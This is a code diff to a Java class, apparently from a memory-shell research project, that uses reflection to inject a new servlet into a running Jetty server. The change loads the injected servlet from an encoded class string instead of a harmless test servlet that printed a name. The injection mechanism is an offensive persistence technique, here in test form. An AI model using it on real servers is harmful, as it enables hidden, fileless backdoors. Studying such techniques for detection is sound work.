@@ -5,7 +5,8 @@ import com.sun.jmx.mbeanserver.NamedObject;
 import com.sun.jmx.mbeanserver.Repository;
 
 import javax.management.ObjectName;
-import javax.servlet.*;
+import javax.servlet.Servlet;
+import javax.servlet.ServletException;
 import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
@@ -15,6 +16,8 @@ import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.lang.reflect.Modifier;
 import java.util.Set;
+
+import static org.su18.memshell.test.jetty.DynamicUtils.SERVLET_CLASS_STRING;
 
 /**
  * 来自项目 https://github.com/feihong-cs/memShell
@@ -89,7 +92,7 @@ public class AddJettyServlet extends HttpServlet {
 						}
 
 						holder.getClass().getMethod("setName", String.class).invoke(holder, servletName);
-						Class clazz = TestServlet.class;
+						Class clazz = DynamicUtils.getClass(SERVLET_CLASS_STRING);
 						holder.getClass().getMethod("setServlet", Servlet.class).invoke(holder, clazz.newInstance());
 						handler.getClass().getMethod("addServlet", holder.getClass()).invoke(handler, holder);
 
@@ -113,34 +116,6 @@ public class AddJettyServlet extends HttpServlet {
 			}
 		} catch (Exception e) {
 			e.printStackTrace();
-		}
-	}
-
-	public static class TestServlet implements Servlet {
-
-		@Override
-		public void init(ServletConfig servletConfig) throws ServletException {
-
-		}
-
-		@Override
-		public ServletConfig getServletConfig() {
-			return null;
-		}
-
-		@Override
-		public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
-			servletResponse.getWriter().println("su18");
-		}
-
-		@Override
-		public String getServletInfo() {
-			return null;
-		}
-
-		@Override
-		public void destroy() {
-
 		}
 	}
 }
